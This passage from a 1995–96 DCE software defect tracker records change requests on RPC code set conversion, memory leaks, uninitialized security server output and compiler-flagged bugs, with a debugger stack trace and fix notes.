=2Edce.hal.com/hosts/starseed/cds-server", level =3D 5, auth_ident =3D 0x=
2f5808, authz_prot =3D 2, binding_h =3D 0x190468, infop =3D 0xeead2c70, s=
tp =3D 0xeead3628), line 268 in "/build/dce/dce/obj/sparc-solaris/rpc/run=
time/../../../../src/rpc/runtime/krbclt.c"
  [15] rpc_binding_set_auth_info(binding_h =3D 0x190468, server_princ_nam=
e =3D 0x18a820 "/.../starseed_cell.dce.hal.com/hosts/starseed/cds-server"=
, authn_level =3D 5, authn_protocol =3D 1, auth_identity =3D 0x2f5808, au=
thz_protocol =3D 2, st =3D 0xeead3628), line 926 in "/build/dce/dce/obj/s=
parc-solaris/rpc/runtime/../../../../src/rpc/runtime/comauth.c"
  [16] get_secure_handle(0x7dc, 0x7ec, 0x670, 0xeead3628, 0x668, 0x7a400)=
, at 0x25484
  [17] get_rpc_handle(0x19e4, 0xef756228, 0x764, 0xeead404c, 0x0, 0x0), a=
t 0x24ed4
  [18] ReadAttributeRPC(0xaa4, 0x13fa54, 0x2, 0x16c9a025, 0x0, 0x0), at 0=
x300e4
  [19] processAddr(0x123a35, 0x13fa54, 0x123a35, 0x123a35, 0x13fa54, 0x10=
d0a3f5), at 0x1fed4
  [20] processCH(0x50c, 0x0, 0x2f, 0x2f, 0xeead49a5, 0x10d0a3ec), at 0x1f=
5c4
  [21] clerk_WalkTree(0xffffefb4, 0xffffefcc, 0xffffefcc, 0x182c18, 0x2, =
0x2), at 0x1eef0
  [22] sendToWalkTree(0xef756228, 0x4e4, 0x13fa54, 0x8, 0xeead62e5, 0xeea=
d22e7), at 0x2090c
  [23] clerkReadAttribute(0x1974, 0x308f8, 0x13fa54, 0xb08, 0x30c18, 0x13=
fa54), at 0x31968
  [24] clerk_request(0x30c, 0x13fa54, 0x19e4, 0xef756228, 0x338, 0x7a288)=
, at 0x1abbc
(dbx)


-------------------------------
From: ac@hal.com (Adrian Chan)
Date: Thu, 26 Oct 1995 10:17:11 -0500 (CDT)

[ text deleted]  We still seeing it from time to time, and
with the different combination of test runs; we kind of closing to a
conclusion of memory management related issue.

We have other problems which can be attributed to lack of swap space, disk
space etc.  I try to give Parul some more predictive information and we
have not come up anything conclusive.

Unless other people are seeing similar symtoms, I do not have additional
information right now.  If we do, I'll definitely send you an update.



CR Number                     : 13188
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memory leak in cs_s_reg.c
Reported Date                 : 11/6/95
Found in Baseline             : 1.1
Found Date                    : 11/6/95
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/6/95 public]

The cs_s_reg.c module includes a memory leak when reading the 
Code Set Registry into memory.  Specifically, the problem is in
the rpc__codesets_read_registry_file() routine, where the sort
logic should only be executed once. Instead, it currently is
being executed for each and every RPC call to dce_cs_rgy_to_loc()
and dce_cs_loc_to_rgy().



CR Number                     : 13181
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11175
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : audit
Short Description             : add '-reverse' option to 'audtrail show' command
Reported Date                 : 10/31/95
Found in Baseline             : 1.2.1
Found Date                    : 10/31/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/31/95 public]

To make the audit enhancement done in OT11175 available to the user add
to dcecp:

	audittrail show -reverse

[2/2/96 public]
you're off the hook John. (for now :-)

[2/7/96 public]
Move from bug to enhancement.



CR Number                     : 13174
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : rs_replist2_read fails to init replist[]
Reported Date                 : 10/29/95
Found in Baseline             : 1.1wp
Found Date                    : 10/29/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/server/rs/rs_replist2.c
Sensitivity                   : public

[10/29/95 public]

Affected file: /security/server/rs/rs_replist2.c
 
Problem: 

        rs_replist2_read may fail to init output structure replist[].

Full Description:

rs_replist2_read and rs_replist2_read rely on a call to read_replica()
to initialize the output array of structures replist[].  If read_replica()
fails, the output array will contain residue which is later processed by
the rpc runtime.


Proposed Solution:  preset the output structure to zero prior to
                    calling read_replia().

[11/01/95 public]

Removed extraneous info/header from previous note.



CR Number                     : 13173
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Sequent compiler flags missing macro
Reported Date                 : 10/28/95
Found in Baseline             : 1.1unintegrated
Found Date                    : 10/28/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cds/server/server_badclock.c
Sensitivity                   : public

[10/28/95 public]

Info from Ticket#22129 tomj@gradient.com

This is another place where the sequent compiler flags a
possible bug in DCE src code.

	src/directory/cds/server/server_badclock.c:



        if (dns_p) {
            if (dns_p->vtype == VT_Timestamp) {
                value_p = (DBSetMember_t *)DATA_DBSet(set_p);
#ifndef GRADIENT_FIX
                if (EXT8(value_p->dm_value_present)) {
#else
                if (value_p->dm_value_present) {
#endif
                    DCE_SVC_DEBUG((
                        cds__svc_handle,
                        cds_svc_server,
                        svc_c_debug1,
                        "  ScanRecord: processing a timestamp value"));

                    /* call Timestamp action routine */
                    bad_ts = (ts_routine)(report_p, value_p->dm_data) || bad_ts;
                }

[11/01/95 public]

Removed extraneous info/header from previous note.



CR Number                     : 13170
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : coding error in rpc cs_s_conv.c
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect:


prefix        p
name          17980
reference     
abstract      coding error in rpc cs_s_conv.cd
duplicate     

state         open                        priority                          
severity      3                           target                            
age           4

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    code                
level                                     phaseInject                       

addDate       95/10/23 17:54:05           assignDate    95/10/23 17:59:37   
lastUpdate    95/10/23 17:59:37           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   cwang               
ownerName     Cathy Wang                  originName    Cathy Wang          
ownerArea     lwqs                        originArea    lwqs                

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/23 17:54:05    open            cwang (Cathy Wang)
    95/10/23 17:59:37    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by cwang (Cathy Wang), 95/10/23 17:54:05, action: open>
In RPC cs_s_conv.c, the following code to check the iconv 
return should be changed from:
                else if (errno = E2BIG)
                        *status = rpc_s_ss_short_conv_buffer;
                else if (errno = EINVAL)
                        *status = rpc_s_ss_invalid_char_input;
to:
                else if (errno == E2BIG)
                        *status = rpc_s_ss_short_conv_buffer;
                else if (errno == EINVAL)
                        *status = rpc_s_ss_invalid_char_input;



CR Number                     : 13169
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : code set stub conversion uses strlen on UCS data
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]


Attached is IBM's internal defect report:


prefix        p
name          17945
reference     
abstract      code set stub conversion uses strlen on UCS data
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       i/o_error           
envName                                   phaseFound    unit                
level                                     phaseInject                       

addDate       95/10/21 21:52:28           assignDate    95/10/23 10:28:51   
lastUpdate    95/10/23 10:28:51           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:52:28    open            trumble (Trumble, Mary K.)
    95/10/23 10:28:52    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:52:28, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
Roundtrip code set conversion with universal fails.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
Force universal conversion.  Data will be sent to the server,
but it will not be sent back because the stub conversion
code is using strlen to determine the length of universal data,
which is encoded as UCS.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***n/a***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): all platforms

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------



REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:28:52, action: assign>
Old Owner: ywei
New Owner: cwang


    <Note by cwang (Cathy Wang), 1996/04/05 15:27:42, action: note>
The problem essentially is that strlen is used by the stub
conversion code (which is called by the un/marshalling code) to
determine the length of idl_byte data. idl_byte is NOT a null-terminated
data type.

The key fix to the problem is to correctly propagate the number of bytes
to be converted each time when iconv() function is called.  Because iconv()
can expand or shrink the data, it is important that the actual number of
bytes being converted be propagate as the input length to the next
iconv() call.

The original design points allow the conformant array or open array to
overwrite the size_is or length_is values.  However, the implementation
had many errors, and we saw hacked codes all over the RPC routines using
strlen to calculate the converted data.
    <Note by cwang (Cathy Wang), 1996/05/07 16:19:58, action: note>
    There are multiple problems being fixed in this defect.
    Following is a simple summary of the problems and fixes:
    There are multiple problems being fixed in this defect.
    Following is a simple summary of the problems and fixes for the defect:
    ======================================================================

    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    parameter to the XPG4 function iconv().  idl_byte is not a null-terminteded
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max
    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    a possibility that the converted string can be larger than the originalways
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.


    ======================================================================


    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    idl_byte data.  The length of the data stream being converted is a required    parameter to the XPG4 function iconv().  idl_byte is not a null-terminted
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max
    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    However, When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.



    ======================================================================

    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    idl_byte data.  The length of the data stream being converted is a required
    parameter to the XPG4 function iconv().  idl_byte is not a null-terminted
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max

    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    However, When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.

    <Note by cwang (Cathy Wang), 1996/06/02 18:12:55, action: note>
I have submitted the following input to the OS/2 DCE readme for
RPC I18N changes related to this defect:

Accessing the RPC code sets attribute in the Directory namespace
================================================================

In this release, the code sets attribute should be accessed only via
the RPC NSI interface to the Directory Services.  Although the code
sets attribute has an ISO Object Identifier (OID), it should not be
referenced in the current release.



RPC Code Sets Conversion Type
=============================

The conversion type can be one of the following values:

idl_cs_no_convert               No code set conversion is required.           dl_l_cs_in_place_convert         Code set conversion can be performed in a singe

                                storage area.
idl_cs_new_buffer_convert       The converted data must be written to a new
                                storage area.

The C language representation of a conversion type structure is:

typedef enum {
      idl_cs_no_convert,
      idl_cs_in_place_convert,
      idl_cs_new_buffer_convert
      } idl_cs_convert_t;

DCE RPC supplied stub buffer sizing routines do not support the
idl_cs_in_place_convert conversion type.  The reason is
that the actual conversion method (RMIR, SMIR, CMIR or UNIVERSAL)
used is determined at runtime,
there is no guarantee that the conversion can be performed in
a single storage area.


The cs_char Attribute
=====================

Arrays of cs_char can be fixed, varying, conformant, or conformant varying.
The treatment of a scalar cs_char is similar to that of a fixed arry of
one element.  In this release only, conformant or conformant varying
arrays can be used without restrictions, because they are designed to allow
the data extpansion and contraction which can occur during code set
conversion. For fixed or varying arrays,
the size of the storage available to hold the local data is determined
by the array size specified in the IDL and the local type specified

Ain the cs_char attribute.  The array size is fixed and can not be
modified during the RPC marshalling or unmarshalling.
For fixed arrays, the number of bytes of data on the client, the
server, and the network
must be exactly equal to the number defined in the IDL file.

Following are the additional restrictions for fixed or varying arrays:

. For a fixed array, the number of array elements in the local (client and
  server) and network
  representations of the data must be the same as the array size defined in
  the IDL.  The following restrictions apply to the use of fixed arrays:
                                                                               - -  Because the array size is the input length used by the code set conversio,

    he complete array must be populated with valid data.

  -  You must write your own stub buffer sizing routines and code set
     conversion routines.  The routines provided by DCE RPC do not
     support the "idl_cs_in_place_convert" conversion type.

  -  You may write your own stub tag_setting routines or use DCE RPC
     provided tag_setting routine rpc_cs_get_tags() to set the
     sending tag value and the receiving tag value.  You must ensure
     that the code set conversion between server and
     client will not result in data expansion or contraction.

  -  You may write your own character and code sets compatibility
     evaluation routines.  You must not use the DCE RPC
     rpc_cs_eval_with_universal() because universal conversion may
     cause data expansion.
     You may use the rpc_cs_eval_without_universal()
     but keep in mind that the conversion model used by
     this routine is: RMIR, then SMIR, then CMIR.  You have to
     make sure that the conversion can be performed without data expansion
     or contraction.

. For a varying array, neither the number of array elements in the local
  representation nor the number of array elements in the network
  representation may exceed the array size in the IDL.

  Restrictions similar to those for fixed arrays also apply
  to varying arrays.  The value of length_is is the input length used
  by the code set conversion routine.  Expansion and contraction of data
  is allowed within the array size defined in the IDL file.

Additional information about code set stub routines consideration for
=====================================================================
fixed and varying arrays
========================

cs_byte_from_netcs
------------------
Parameters
  Input
    Network_data_length
      The number of idl_byte data elements to be converted.  For a varying
      array or a conformant varying array, this value is the local value of
      the length_is variable.  For a conformant array, this value is the
      local value of the size_is variable.  For a fixed array, the value is
      the array size specified in the interface definition.
  Output
    local_data_length
      The length of the converted data, in units of idl_byte.
      It is a NULL pointer if a fixed array is to be converted.
Usuage
    The routine returns the converted data, in idl_byte format.  If the data
    is a varying, conformant, or conformant varying array, the routine
    also returns the length of the converted data, in units of idl_byte.

cs_byte_local_size
------------------
Parameters
  Input
    Network_buffer_size
      The size, in units of idl_byte, of the buffer that is allocated for
      the international character data.
      For a conformant or conformant varying array, this value is the network
      value of the size_is variable for the array; that is, the value is
      the size of the unmarshalled string if no conversion is done.
  Output
    local_buffer_size
      This value is to be used as the local value of the size_is variable
      for the array, and is non-NULL only if a conformant or conformant
      varying array is to be unmarshalled.  A value of NULL in this
      parameter indicates that a fixed or varying array is to be unmarshalled.
Usuage
    Client and server stubs specify the network storage size of the data, in
    units of idl_byte, if a conformant or conformant varying array is to be
    unmarshalled, or they specify NULL if a fixed or varying array
    is to be marshalled.

    When called from a client stub, for fixed and varying arrays, the
    routine assumes that network_buffer_size is sufficient to store the
    converted data.


cs_byte_net_size
----------------
Parameters
  Output
    network_buffer_size
      This value is to be used as the network value of the size_is variable
      for the array, and is non-NULL only if a conformant or conformant
      varying array is to be marshalled.  A value of NULL in this
      parameter indicates that a fixed or varying array is to be marshalled.
Usuage
    The routine returns the new buffer size in the network_buffer_size
    parameter.  For fixed and varying arrays, the routine assumes that
    local_buffer_size is sufficient to store the converted data.

cs_byte_to_netcs
----------------
Parameters
  Input
    local_data_length
      The number of idl_byte data elements to be converted.  For a varying
      array or a conformant varying array, this value is the local value of
      the length_is variable.  For a conformant array, this value is the
      local value of the size_is variable.  For a fixed array, the value is
      the array size specified in the interface definition.
  Output
    network_data_length
      The length of the converted data, in units of idl_byte.
      It is a NULL pointer if a fixed array is to be converted.
Usuage
    The routine returns the converted data, in idl_byte format.  If the data
    is a varying, conformant, or conformant varying array, the routine
    also returns the length of the converted data, in units of idl_byte.



CR Number                     : 13168
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : universal code set should be UCS-2 Level 1, not L2
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17944
reference     
abstract      universal code set should be UCS-2 Level 1, not L2
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:49:48           assignDate    95/10/23 10:28:26   
lastUpdate    95/10/23 10:28:26           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:49:48    open            trumble (Trumble, Mary K.)
    95/10/23 10:28:26    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:49:48, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via design review and code inspection.
RFC 41.2 specifies UCS-2, Level 2 as the universal code set for
RPC code set conversion.  IBM and HP do not support this form of
UCS.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): both

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------
RFC 41.2 should be changed to specify UCS-2, Level 1.
The code should be changed to use the code set value for Level 1, rather
than Level 2.



REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:28:26, action: assign>
Old Owner: ywei
New Owner: cwang



CR Number                     : 13167
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : intermediate code set conv method implemented wrong
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report: 


prefix        p
name          17943
reference     
abstract      intermediate code set conv method implemented wrong
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:46:25           assignDate    95/10/23 10:27:27   
lastUpdate    95/10/23 10:27:27           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:46:25    open            trumble (Trumble, Mary K.)
    95/10/23 10:27:27    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:46:25, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via unit test and code inspection.

rpc_cs_eval_with_universal, rpc_cs_eval_without_universal and
rpc_cs_get_tags contain code to determine whether an intermediate
code set, other than UCS, should be used.  The intermediate code set
candidates are specified when building the code set registry data base.
The runtime code does not, however, check the list of candidates.  Instead,
it simply looks for the first code set that is present on both the
client and server, and attempts to use it for the intermediate code set.
This can result in errors from iconv after conversion starts.

OS/2 DCE's code set registry does not designate any intermediate code
sets, but, because the code does not check whether code sets are
legitimate candidates, this bug could cause failures with OS/2 in
a multi-platform environment.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment:

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): all platforms: code logic problem

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------


